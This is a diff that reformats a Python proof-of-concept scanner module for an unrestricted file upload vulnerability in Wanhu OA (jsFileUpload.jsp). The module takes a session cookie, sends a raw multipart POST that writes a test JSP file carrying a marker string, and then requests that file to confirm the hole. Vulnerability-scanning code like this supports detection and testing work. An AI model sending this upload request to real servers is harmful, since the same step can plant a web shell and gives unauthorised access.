@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Whir_0005' # 平台漏洞编号，留空
+    vuln_id = 'Whir_0005'  # 平台漏洞编号，留空
     name = '万户OA系统 文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-08-28'  # 漏洞公布时间
     desc = '''
         万户OA系统 /defaultroot/work_flow/jsFileUpload.jsp页面未做限制，可上传任意文件。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '万户OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'da2d5670-ec2d-4c4c-8650-429cdc894ac4'
@@ -31,12 +33,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            hh =hackhttp.hackhttp()
+
+            hh = hackhttp.hackhttp()
             payload = '/defaultroot/work_flow/jsFileUpload.jsp?flag=1'
             url = self.target + payload
             code, head, body, errcode, fina_url = hh.http(self.target)
-            m  = re.findall(r'(JSESSIONID=[^;]+);', head)
+            m = re.findall(r'(JSESSIONID=[^;]+);', head)
             if m:
                 raw = '''
 POST /defaultroot/work_flow/jsFileUpload.jsp?flag=1 HTTP/1.1
@@ -62,13 +64,13 @@ testvul_test
 Content-Disposition: form-data; name="submit"
 
 sub
-------WebKitFormBoundarydGdAZ2plNzduNYMp--''' %m[0]
-                shell = self.target + '/defaultroot/devform/workflow/testvul.jsp'        
+------WebKitFormBoundarydGdAZ2plNzduNYMp--''' % m[0]
+                shell = self.target + '/defaultroot/devform/workflow/testvul.jsp'
                 code1, head1, body1, errcode, fina_url = hh.http(url, raw=raw)
                 if code1 == 200:
                     code2, head2, body2, errcode, fina_url = hh.http(shell)
-                    if code2== 200 and 'testvul_test' in body2:
-                        #security_hole(url)
+                    if code2 == 200 and 'testvul_test' in body2:
+                        # security_hole(url)
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
 
@@ -77,6 +79,7 @@ sub
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
